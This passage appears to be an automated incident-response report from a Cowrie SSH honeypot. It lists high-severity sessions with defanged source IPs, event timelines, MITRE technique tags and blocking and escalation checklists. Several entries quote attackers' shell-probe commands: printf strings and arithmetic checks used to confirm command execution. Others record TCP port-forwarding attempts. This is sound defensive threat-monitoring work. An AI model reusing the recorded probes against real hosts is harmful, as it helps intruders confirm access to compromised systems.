- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1a65c3d432f

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-22 05:05 |
| **Last Seen** | 2026-11-22 05:05 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3a35cfa27b1a72c8c2e552ec0945e531_small_control'"'"' '"'"'check_3a35cfa27b1a72c8c2e552ec0945e531'"'"'', printf '\n%s|%s\n' 'check_3a35cfa27b1a72c8c2e552ec0945e531_small_control' 'check_3a35cfa27b1a72c8c2e552ec0945e531', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3a35cfa27b1a72c8c2e552ec0945e531_small_math'"'"' "$((944*632+61))"', (944*632+61, printf '\n%s|%s\n' 'check_3a35cfa27b1a72c8c2e552ec0945e531_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 05:05:01` | `cowrie.session.connect` |
| `2026-11-22 05:05:02` | `cowrie.client.version` |
| `2026-11-22 05:05:02` | `cowrie.client.kex` |
| `2026-11-22 05:05:07` | `cowrie.login.success` |
| `2026-11-22 05:05:10` | `cowrie.client.size` |
| `2026-11-22 05:05:11` | `cowrie.session.params` |
| `2026-11-22 05:05:12` | `cowrie.command.input` |
| `2026-11-22 05:05:12` | `cowrie.command.input` |
| `2026-11-22 05:05:12` | `cowrie.command.input` |
| `2026-11-22 05:05:12` | `cowrie.command.input` |
| `2026-11-22 05:05:12` | `cowrie.command.input` |
| `2026-11-22 05:05:12` | `cowrie.command.input` |
| `2026-11-22 05:05:12` | `cowrie.command.input` |
| `2026-11-22 05:05:12` | `cowrie.command.input` |
| `2026-11-22 05:05:12` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3c3ad71ab6d

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-11-22 05:06 |
| **Last Seen** | 2026-11-22 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 05:06:15` | `cowrie.session.connect` |
| `2026-11-22 05:06:15` | `cowrie.client.version` |
| `2026-11-22 05:06:15` | `cowrie.client.kex` |
| `2026-11-22 05:06:16` | `cowrie.login.success` |
| `2026-11-22 05:06:16` | `cowrie.direct-tcpip.request` |
| `2026-11-22 05:06:16` | `cowrie.direct-tcpip.ja4` |
| `2026-11-22 05:06:16` | `cowrie.direct-tcpip.data` |
| `2026-11-22 05:06:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4395fb70f8fb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.95[.]118` |
| **First Seen** | 2026-11-22 05:06 |
| **Last Seen** | 2026-11-22 05:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 05:06:18` | `cowrie.session.connect` |
| `2026-11-22 05:06:18` | `cowrie.client.version` |
| `2026-11-22 05:06:19` | `cowrie.client.kex` |
| `2026-11-22 05:06:19` | `cowrie.login.success` |
| `2026-11-22 05:06:19` | `cowrie.direct-tcpip.request` |
| `2026-11-22 05:06:19` | `cowrie.direct-tcpip.ja4` |
| `2026-11-22 05:06:19` | `cowrie.direct-tcpip.data` |
| `2026-11-22 05:06:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.95[.]118` to AbuseIPDB if not already reported
- [ ] Block `80.94.95[.]118` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-304761b9d596

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-22 05:07 |
| **Last Seen** | 2026-11-22 05:08 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f41c79d6c0213e0f1bdfd64da97bd9ee_small_control'"'"' '"'"'check_f41c79d6c0213e0f1bdfd64da97bd9ee'"'"'', printf '\n%s|%s\n' 'check_f41c79d6c0213e0f1bdfd64da97bd9ee_small_control' 'check_f41c79d6c0213e0f1bdfd64da97bd9ee', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f41c79d6c0213e0f1bdfd64da97bd9ee_small_math'"'"' "$((679*470+25))"', (679*470+25, printf '\n%s|%s\n' 'check_f41c79d6c0213e0f1bdfd64da97bd9ee_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 05:07:56` | `cowrie.session.connect` |
| `2026-11-22 05:07:57` | `cowrie.client.version` |
| `2026-11-22 05:07:57` | `cowrie.client.kex` |
| `2026-11-22 05:08:02` | `cowrie.login.success` |
| `2026-11-22 05:08:05` | `cowrie.client.size` |
| `2026-11-22 05:08:06` | `cowrie.session.params` |
| `2026-11-22 05:08:08` | `cowrie.command.input` |
| `2026-11-22 05:08:08` | `cowrie.command.input` |
| `2026-11-22 05:08:08` | `cowrie.command.input` |
| `2026-11-22 05:08:08` | `cowrie.command.input` |
| `2026-11-22 05:08:08` | `cowrie.command.input` |
| `2026-11-22 05:08:08` | `cowrie.command.input` |
| `2026-11-22 05:08:08` | `cowrie.command.input` |
| `2026-11-22 05:08:08` | `cowrie.command.input` |
| `2026-11-22 05:08:08` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca45550a6f91

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-11-22 05:08 |
| **Last Seen** | 2026-11-22 05:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 05:08:52` | `cowrie.session.connect` |
| `2026-11-22 05:08:52` | `cowrie.client.version` |
| `2026-11-22 05:08:52` | `cowrie.client.kex` |
| `2026-11-22 05:08:52` | `cowrie.login.success` |
| `2026-11-22 05:08:52` | `cowrie.direct-tcpip.request` |
| `2026-11-22 05:08:52` | `cowrie.direct-tcpip.ja4` |
| `2026-11-22 05:08:52` | `cowrie.direct-tcpip.data` |
| `2026-11-22 05:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4448e3469e45

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-22 05:10 |
| **Last Seen** | 2026-11-22 05:11 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_686fa2d6365a87df4037d33c3d2c3c3f_small_control'"'"' '"'"'check_686fa2d6365a87df4037d33c3d2c3c3f'"'"'', printf '\n%s|%s\n' 'check_686fa2d6365a87df4037d33c3d2c3c3f_small_control' 'check_686fa2d6365a87df4037d33c3d2c3c3f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_686fa2d6365a87df4037d33c3d2c3c3f_small_math'"'"' "$((814*65+61))"', (814*65+61, printf '\n%s|%s\n' 'check_686fa2d6365a87df4037d33c3d2c3c3f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 05:10:44` | `cowrie.session.connect` |
| `2026-11-22 05:10:46` | `cowrie.client.version` |
| `2026-11-22 05:10:46` | `cowrie.client.kex` |
| `2026-11-22 05:10:51` | `cowrie.login.success` |
| `2026-11-22 05:10:54` | `cowrie.client.size` |
| `2026-11-22 05:10:56` | `cowrie.session.params` |
| `2026-11-22 05:10:57` | `cowrie.command.input` |
| `2026-11-22 05:10:57` | `cowrie.command.input` |
| `2026-11-22 05:10:57` | `cowrie.command.input` |
| `2026-11-22 05:10:57` | `cowrie.command.input` |
| `2026-11-22 05:10:57` | `cowrie.command.input` |
| `2026-11-22 05:10:57` | `cowrie.command.input` |
| `2026-11-22 05:10:57` | `cowrie.command.input` |
| `2026-11-22 05:10:57` | `cowrie.command.input` |
| `2026-11-22 05:10:57` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40f3eaa3167e

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-22 05:13 |
| **Last Seen** | 2026-11-22 05:13 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_9c2fed46b9b5e09b6358f79a9f8382cb_small_control'"'"' '"'"'check_9c2fed46b9b5e09b6358f79a9f8382cb'"'"'', printf '\n%s|%s\n' 'check_9c2fed46b9b5e09b6358f79a9f8382cb_small_control' 'check_9c2fed46b9b5e09b6358f79a9f8382cb', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_9c2fed46b9b5e09b6358f79a9f8382cb_small_math'"'"' "$((104*292+20))"', (104*292+20, printf '\n%s|%s\n' 'check_9c2fed46b9b5e09b6358f79a9f8382cb_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 05:13:34` | `cowrie.session.connect` |
| `2026-11-22 05:13:35` | `cowrie.client.version` |
| `2026-11-22 05:13:35` | `cowrie.client.kex` |
| `2026-11-22 05:13:40` | `cowrie.login.success` |
| `2026-11-22 05:13:43` | `cowrie.client.size` |
| `2026-11-22 05:13:44` | `cowrie.session.params` |
| `2026-11-22 05:13:44` | `cowrie.command.input` |
| `2026-11-22 05:13:44` | `cowrie.command.input` |
| `2026-11-22 05:13:44` | `cowrie.command.input` |
| `2026-11-22 05:13:44` | `cowrie.command.input` |
| `2026-11-22 05:13:44` | `cowrie.command.input` |
| `2026-11-22 05:13:44` | `cowrie.command.input` |
| `2026-11-22 05:13:44` | `cowrie.command.input` |
| `2026-11-22 05:13:44` | `cowrie.command.input` |
| `2026-11-22 05:13:44` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b73fbeeb2329

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-11-22 05:18 |
| **Last Seen** | 2026-11-22 05:19 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8c58ee5d0f9977fe3611185f077a9606_small_control'"'"' '"'"'check_8c58ee5d0f9977fe3611185f077a9606'"'"'', printf '\n%s|%s\n' 'check_8c58ee5d0f9977fe3611185f077a9606_small_control' 'check_8c58ee5d0f9977fe3611185f077a9606', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8c58ee5d0f9977fe3611185f077a9606_small_math'"'"' "$((37*571+39))"', (37*571+39, printf '\n%s|%s\n' 'check_8c58ee5d0f9977fe3611185f077a9606_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-22 05:18:58` | `cowrie.session.connect` |
| `2026-11-22 05:18:59` | `cowrie.client.version` |
| `2026-11-22 05:18:59` | `cowrie.client.kex` |
| `2026-11-22 05:19:03` | `cowrie.login.success` |
| `2026-11-22 05:19:06` | `cowrie.client.size` |
| `2026-11-22 05:19:08` | `cowrie.session.params` |
| `2026-11-22 05:19:09` | `cowrie.command.input` |
| `2026-11-22 05:19:09` | `cowrie.command.input` |
| `2026-11-22 05:19:09` | `cowrie.command.input` |
| `2026-11-22 05:19:09` | `cowrie.command.input` |
| `2026-11-22 05:19:09` | `cowrie.command.input` |
| `2026-11-22 05:19:09` | `cowrie.command.input` |
| `2026-11-22 05:19:09` | `cowrie.command.input` |
| `2026-11-22 05:19:09` | `cowrie.command.input` |
| `2026-11-22 05:19:09` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (179) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-506b782af9ae | HIGH | `80.94.92[.]234` | 2026-11-22 05:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-ed90c56750bf | HIGH | `35.210.22[.]77` | 2026-11-22 05:49 | Y | 3 | 0 | `T1078` |
| IR-b027e7d0315e | HIGH | `35.206.174[.]128` | 2026-11-22 06:00 | Y | 3 | 0 | `T1078` |
| IR-1ab2a63c81d8 | HIGH | `35.210.184[.]237` | 2026-11-22 06:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-50bdbb462552 | HIGH | `35.210.98[.]104` | 2026-11-22 06:25 | Y | 3 | 0 | `T1078` |
| IR-a9d9c02e2094 | HIGH | `176.53.159[.]196` | 2026-11-22 06:51 | Y | 0 | 0 | `T1078 · T1592` |
| IR-9278cff3cf9b | HIGH | `138.226.239[.]233` | 2026-11-22 07:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2ae9c6410c40 | HIGH | `138.226.239[.]234` | 2026-11-22 07:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-46beadda949e | HIGH | `80.94.95[.]118` | 2026-11-22 07:18 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7f6758f77d28 | HIGH | `78.128.112[.]74` | 2026-11-22 07:22 | Y | 1 | 0 | `T1078 · T1592` |
| IR-b5871ba34066 | HIGH | `45.32.129[.]154` | 2026-11-22 07:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d3ccd7cae977 | HIGH | `193.32.162[.]15` | 2026-11-22 07:41 | Y | 0 | 0 | `T1078 · T1592` |
| IR-89cb3808171a | HIGH | `80.94.92[.]55` | 2026-11-22 07:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4984d99cb5d7 | HIGH | `80.94.92[.]55` | 2026-11-22 07:48 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-def7e49baac7 | HIGH | `80.94.92[.]55` | 2026-11-22 07:50 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-709a95ffc539 | HIGH | `80.94.92[.]55` | 2026-11-22 07:55 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6e24b4c775da | HIGH | `211.230.3[.]71` | 2026-11-22 07:56 | Y | 1 | 3 | `T1059.004 · T1078 · T1105` |
| IR-812059e859f2 | HIGH | `80.94.92[.]55` | 2026-11-22 07:57 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c1d7f8dcdb20 | HIGH | `221.131.139[.]70` | 2026-11-22 07:58 | Y | 1 | 0 | `T1027 · T1078 · T1592` |
| IR-90fd2f210b65 | HIGH | `80.94.92[.]55` | 2026-11-22 08:00 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c103b305cfef | HIGH | `80.94.92[.]55` | 2026-11-22 08:03 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-859e52763aaf | HIGH | `144.22.238[.]238` | 2026-11-22 08:03 | Y | 0 | 0 | `T1078 · T1592` |
| IR-79d423e4c1cf | HIGH | `80.94.92[.]55` | 2026-11-22 08:05 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5a396ea14cb5 | HIGH | `218.244.143[.]162` | 2026-11-22 08:08 | Y | 10 | 0 | `T1003.008 · T1059.004 · T1078` |
| IR-4646c37cc7ee | HIGH | `80.94.92[.]55` | 2026-11-22 08:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-cdd8bd205c4d | HIGH | `80.94.92[.]55` | 2026-11-22 08:11 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9d8956b5c187 | HIGH | `80.94.92[.]55` | 2026-11-22 08:13 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e7aa1d6c95f3 | HIGH | `80.94.92[.]55` | 2026-11-22 08:16 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c7e39c7b7793 | HIGH | `80.94.92[.]55` | 2026-11-22 08:18 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1ce3a100e600 | HIGH | `80.94.92[.]55` | 2026-11-22 08:21 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-adddba249ec2 | HIGH | `80.94.92[.]55` | 2026-11-22 08:23 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8d75aadeb919 | HIGH | `80.94.92[.]55` | 2026-11-22 08:26 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-3f08ff615fc3 | HIGH | `211.230.3[.]71` | 2026-11-22 08:27 | Y | 7 | 0 | `T1078 · T1083` |
| IR-382c76e813b2 | HIGH | `80.94.92[.]55` | 2026-11-22 08:29 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-42f60ee60999 | HIGH | `80.94.92[.]55` | 2026-11-22 08:31 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-571bf173658d | HIGH | `80.94.92[.]55` | 2026-11-22 08:34 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-da90e5430aca | HIGH | `80.94.92[.]55` | 2026-11-22 08:36 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-f76b035de0ec | HIGH | `80.94.92[.]55` | 2026-11-22 08:38 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-cbbe6676ae9e | HIGH | `80.94.92[.]55` | 2026-11-22 08:40 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6fccff597808 | HIGH | `80.94.92[.]55` | 2026-11-22 08:42 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9ef684b0948a | HIGH | `80.94.92[.]55` | 2026-11-22 08:44 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c682740da7cf | HIGH | `80.94.92[.]55` | 2026-11-22 08:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-8eef950788cb | HIGH | `23.132.164[.]185` | 2026-11-22 08:48 | Y | 1 | 0 | `T1078 · T1592` |
| IR-71c23d802946 | HIGH | `80.94.92[.]55` | 2026-11-22 08:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b55734836d41 | HIGH | `80.94.92[.]55` | 2026-11-22 08:51 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-dfb55fb4b964 | HIGH | `80.94.92[.]55` | 2026-11-22 08:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1b4e83053a82 | HIGH | `80.94.92[.]55` | 2026-11-22 08:56 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-dca20c8246d0 | HIGH | `80.94.92[.]55` | 2026-11-22 08:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0fade9fad15d | HIGH | `1.95.88[.]254` | 2026-11-22 09:19 | Y | 1 | 0 | `T1078 · T1592` |
| IR-6400b056ef96 | HIGH | `80.94.95[.]118` | 2026-11-22 09:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5c2b53fb609e | HIGH | `138.226.239[.]234` | 2026-11-22 09:21 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c05b24b9a99c | HIGH | `138.226.239[.]233` | 2026-11-22 09:22 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c68bf0c94869 | HIGH | `176.53.159[.]196` | 2026-11-22 09:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-695e9cace35e | HIGH | `217.60.240[.]247` | 2026-11-22 09:45 | Y | 0 | 0 | `T1078` |
| IR-3049a3ac3200 | HIGH | `201.170.43[.]224` | 2026-11-22 09:49 | Y | 9 | 0 | `T1057 · T1078 · T1083` |
| IR-c197215598b2 | HIGH | `92.118.39[.]14` | 2026-11-22 10:03 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-718d2c601e92 | HIGH | `92.118.39[.]14` | 2026-11-22 10:05 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-fc7b445e6fd2 | HIGH | `92.118.39[.]14` | 2026-11-22 10:07 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-42a3875a979d | HIGH | `176.53.159[.]196` | 2026-11-22 10:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f5d954545829 | HIGH | `92.118.39[.]14` | 2026-11-22 10:09 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-7d75f0c75a4b | HIGH | `92.118.39[.]14` | 2026-11-22 10:11 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e6f404f44454 | HIGH | `92.118.39[.]14` | 2026-11-22 10:13 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d8a5e1f52daf | HIGH | `92.118.39[.]14` | 2026-11-22 10:14 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-de455a271593 | HIGH | `110.219.4[.]9` | 2026-11-22 10:16 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-6e02765d258e | HIGH | `92.118.39[.]14` | 2026-11-22 10:16 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-1b51f4b46e37 | HIGH | `92.118.39[.]14` | 2026-11-22 10:18 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-578b9b31b9a3 | HIGH | `92.118.39[.]14` | 2026-11-22 10:20 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-934b61135cf8 | HIGH | `92.118.39[.]14` | 2026-11-22 10:22 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-afd1f5a73a29 | HIGH | `92.118.39[.]14` | 2026-11-22 10:24 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-d559eb5176ff | HIGH | `92.118.39[.]14` | 2026-11-22 10:26 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-90ea3d86d774 | HIGH | `92.118.39[.]14` | 2026-11-22 10:28 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-45f20fc2c2e4 | HIGH | `92.118.39[.]14` | 2026-11-22 10:30 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-46709e7eb99c | HIGH | `92.118.39[.]14` | 2026-11-22 10:33 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-cf3a66945ead | HIGH | `92.118.39[.]14` | 2026-11-22 10:35 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-66575defebe7 | HIGH | `92.118.39[.]14` | 2026-11-22 10:37 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-fc00745c962f | HIGH | `92.118.39[.]14` | 2026-11-22 10:39 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-5917160745f8 | HIGH | `92.118.39[.]14` | 2026-11-22 10:41 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ad829814a54f | HIGH | `92.118.39[.]14` | 2026-11-22 10:43 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6762a74b9b09 | HIGH | `92.118.39[.]14` | 2026-11-22 10:45 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4e5f9a3152ea | HIGH | `92.118.39[.]14` | 2026-11-22 10:47 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bb5d2dec43c9 | HIGH | `92.118.39[.]14` | 2026-11-22 10:49 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-46880db922ee | HIGH | `192.155.90[.]118` | 2026-11-22 10:49 | Y | 3 | 0 | `T1078` |
| IR-e98719c75d4c | HIGH | `92.118.39[.]14` | 2026-11-22 10:50 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-c06eabcf2455 | HIGH | `92.118.39[.]14` | 2026-11-22 10:52 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b9ff38c1f965 | HIGH | `203.145.143[.]181` | 2026-11-22 10:53 | Y | 0 | 0 | `T1078 · T1105 · T1592` |
| IR-2aa7e5241447 | HIGH | `92.118.39[.]14` | 2026-11-22 10:54 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-29dc1bad9996 | HIGH | `92.118.39[.]14` | 2026-11-22 10:56 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ca7b9350486c | HIGH | `92.118.39[.]14` | 2026-11-22 10:58 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-67e2b9e630b2 | HIGH | `27.79.0[.]195` | 2026-11-22 10:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-041a7e9c302c | HIGH | `92.118.39[.]14` | 2026-11-22 10:59 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-9bbd51ba6003 | HIGH | `92.118.39[.]14` | 2026-11-22 11:01 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b004779e837e | HIGH | `92.118.39[.]14` | 2026-11-22 11:03 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-bd9351699f88 | HIGH | `92.118.39[.]14` | 2026-11-22 11:05 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-6d4f7cca519c | HIGH | `92.118.39[.]14` | 2026-11-22 11:06 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-4b0a30298819 | HIGH | `92.118.39[.]14` | 2026-11-22 11:08 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-ec66dc4bda22 | HIGH | `92.118.39[.]14` | 2026-11-22 11:10 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-0a6b29ade754 | HIGH | `92.118.39[.]14` | 2026-11-22 11:12 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-39a44006d539 | HIGH | `92.118.39[.]14` | 2026-11-22 11:14 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-b6b3ea274da8 | HIGH | `92.118.39[.]14` | 2026-11-22 11:15 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
| IR-e639cb61e82a | HIGH | `92.118.39[.]14` | 2026-11-22 11:17 | Y | 42 | 0 | `T1059.004 · T1078 · T1592` |
_… 79 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
